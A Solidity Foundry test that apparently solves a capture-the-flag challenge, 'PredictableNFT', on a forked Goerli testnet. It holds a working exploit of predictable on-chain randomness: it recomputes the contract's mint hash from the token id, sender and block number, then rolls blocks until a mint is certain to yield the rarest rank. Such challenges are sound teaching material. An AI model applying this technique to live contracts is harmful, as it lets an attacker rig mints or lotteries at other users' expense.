// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
    address nft;

    address hacker = address(0x1234);

    function setUp() public {
        vm.createSelectFork("goerli");
        vm.deal(hacker, 1 ether);
        nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
    }

    function test() public {
        vm.startPrank(hacker);
        uint mintedId;
        uint currentBlockNum = block.number;

        // Mint a Superior one, and do it within the next 100 blocks.
        for (uint i = 0; i < 100; ++i) {
            vm.roll(currentBlockNum);

            // ---- hacking time ----

            // Calling id() function which returns value needed for calculating the hash value
            (, bytes memory retId) = nft.call(abi.encodeWithSignature("id()"));
            uint id = uint(bytes32(retId));

            // Hash calculation based on formula from mint() function
            bytes32 hash = keccak256(abi.encode(++id, hacker, currentBlockNum));

            // Call mint() func only if below statement resolve to true
            if (uint(hash) % 100 > 90) {
                (, bytes memory mintId) = nft.call{value: 1e18}(
                    abi.encodeWithSignature("mint()")
                );
                // Assigning the proper value to variable which is used in next steps
                // to estimate the challenge result
                mintedId = uint(bytes32(mintId));
                // Escape the loop.
                break;
            }

            ++currentBlockNum;
        }

        // get rank from `mapping(tokenId => rank)`
        (, bytes memory ret) = nft.call(
            abi.encodeWithSignature("tokens(uint256)", mintedId)
        );
        uint mintedRank = uint(bytes32(ret));
        assertEq(mintedRank, 3, "not Superior(rank != 3)");
    }
}
